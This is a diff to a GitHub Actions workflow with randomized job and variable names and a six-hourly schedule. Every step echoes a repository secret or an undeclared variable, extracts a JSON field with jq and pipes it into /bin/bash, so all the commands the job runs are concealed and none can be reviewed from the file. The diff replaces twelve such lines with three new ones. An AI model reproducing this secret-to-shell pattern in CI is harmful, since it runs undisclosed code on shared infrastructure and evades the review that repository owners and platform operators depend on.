@@ -3,26 +3,18 @@ name: jujianmen9817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
-jobs:  # 29740
+    - cron: '40 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jujianmen9817
         env:
-          rmfn115: ${{ secrets.rmfn115 }}
+          snzj9447: ${{ secrets.snzj9447 }}
         run: |
-          echo $rmfn115 | jq -r .lh1531 | /bin/bash
-          echo $vfjdi82 | jq -r .lw1 | /bin/bash
-          echo $aaqk7523 | jq -r .gmam8 | /bin/bash
-          echo $jijkb1 | jq -r .gwd71102 | /bin/bash
-          echo $mk8463 | jq -r .dq31037 | /bin/bash
-          echo $g75523 | jq -r .q04 | /bin/bash
-          echo $jfwm26346 | jq -r .jpjhv46368 | /bin/bash
-          echo $wp448 | jq -r .z3789 | /bin/bash
-          echo $hef72206 | jq -r .fpt0873 | /bin/bash
-          echo $timcy404 | jq -r .u264 | /bin/bash
-          echo $ycubu8 | jq -r .nhj927 | /bin/bash
-          echo $ufpu6615 | jq -r .tjxni8420 | /bin/bash
+          echo $snzj9447 | jq -r .sb01094 | /bin/bash
+          echo $zqw24721 | jq -r .zuo75 | /bin/bash
+          echo $u2 | jq -r .fdi7699 | /bin/bash
 
